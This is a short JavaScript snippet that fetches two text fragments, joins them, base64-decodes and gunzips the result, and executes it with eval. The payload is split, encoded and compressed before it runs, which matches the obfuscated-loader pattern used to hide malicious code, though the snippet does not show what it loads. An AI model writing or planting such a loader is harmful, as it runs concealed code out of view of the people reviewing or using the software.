(async function(){
  const r1=await fetch('b1.txt').then(r=>r.text());
  const r2=await fetch('b2.txt').then(r=>r.text());
  const bin=Uint8Array.from(atob(r1+r2),c=>c.charCodeAt(0));
  const ds=new DecompressionStream("gzip");
  const stream=new Response(bin).body.pipeThrough(ds);
  const text=await new Response(stream).text();
  (0,eval)(text);
})();
